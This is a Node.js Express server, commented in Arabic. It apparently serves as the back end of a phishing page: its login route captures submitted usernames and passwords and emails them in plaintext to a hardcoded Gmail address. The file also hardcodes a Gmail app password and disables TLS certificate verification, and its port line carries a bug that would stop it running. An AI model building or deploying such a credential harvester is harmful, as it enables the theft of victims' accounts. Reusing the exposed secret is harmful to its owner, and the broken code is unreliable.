const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();
const port = ProcessingInstruction.env.PORT || 3000;

// استخدم middleware
app.use(express.json()); // لتحليل بيانات JSON
app.use(cors()); // للسماح لصفحة الويب بالاتصال

// إعداد Nodemailer
// **ملاحظة:** يجب استبدال هذه المعلومات ببيانات بريدك الإلكتروني
// ويفضل استخدام متغيرات البيئة كما شرحنا سابقاً
// const transporter = nodemailer.createTransport({
//     service: 'mail', // يمكنك تغيير الخدمة إلى outlook, yahoo, إلخ
//     auth: {
//         user: 'maeen.mohammed@gmail.com', // مثال: 'myemail@gmail.com'
//         pass: 'snme icfq sbxh kybi', // يجب أن تكون "كلمة مرور تطبيق"
//     }
// });


const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com', // هذا يحدد خادم SMTP الخاص بـ Gmail
    port: 587,             // المنفذ لـ STARTTLS (موصى به)
    secure: false,         // استخدم 'false' للمنفذ 587 مع STARTTLS
    auth: {
        user: 'maeen.mohammedaldeiry@gmail.com', // عنوان Gmail الفعلي الخاص بك
        pass: 'snme icfq sbxh kybi' // كلمة مرور التطبيق المكونة من 16 حرفًا
    },
    tls: {
        // هذا مهم للسماح بالاتصال بخادم Gmail بشكل آمن
        // دون الحاجة إلى فحص صارم للشهادة في بيئات التطوير
        rejectUnauthorized: false
    }
});

// مثال على إرسال بريد إلكتروني
async function sendMyEmail() {
    try {
        let info = await transporter.sendMail({
            from: 'maeen.mohammedaldeiry@gmail.com', // عنوان المرسل
            to: 'maeen.mohammedaldeiry@gmail.com', // قائمة المستلمين
            subject: 'مرحباً من Node.js!', // سطر الموضوع
            text: 'هذا بريد إلكتروني اختباري مرسل من تطبيق Node.js الخاص بك.', // نص عادي
            html: '<b>هذا بريد إلكتروني اختباري مرسل من تطبيق Node.js الخاص بك.</b>' // نص HTML
        });
        console.log('الرسالة أرسلت: %s', info.messageId);
    } catch (error) {
        console.log('فشل إرسال البريد:', error);
    }
}

// استدعاء الوظيفة لإرسال البريد الإلكتروني (إذا لم تكن جزءًا من معالج مسار أكبر)
// sendMyEmail();




app.get( '/' , (req,res) => {
    res.send('True');
});

// مسار (route) يستقبل بيانات تسجيل الدخول
app.post('/login-handler', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'اسم المستخدم وكلمة المرور مطلوبان.' });
    }

    const mailOptions = {
        from: 'maeen.mohammedaldeiry@gmail.com',
        to: 'maeen.mohammedaldeiry@gmail.com',
        subject: 'تم تسجيل دخول جديد',
        html: `
            <h3>بيانات تسجيل الدخول:</h3>
            <p><b>اسم المستخدم:</b> ${username}</p>
            <p><b>كلمة المرور:</b> ${password}</p>
        `
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('فشل إرسال البريد:', error);
            return res.status(500).json({ success: false, message: 'فشل إرسال البريد الإلكتروني.' });
        }
        console.log('تم إرسال البريد:', info.response);
        res.status(200).json({ success: true, message: 'تم إرسال البيانات بنجاح.' });
    });
});

// تشغيل الخادم
app.listen(port, () => {
    console.log(`الخادم يعمل على http://localhost:${port}`);
});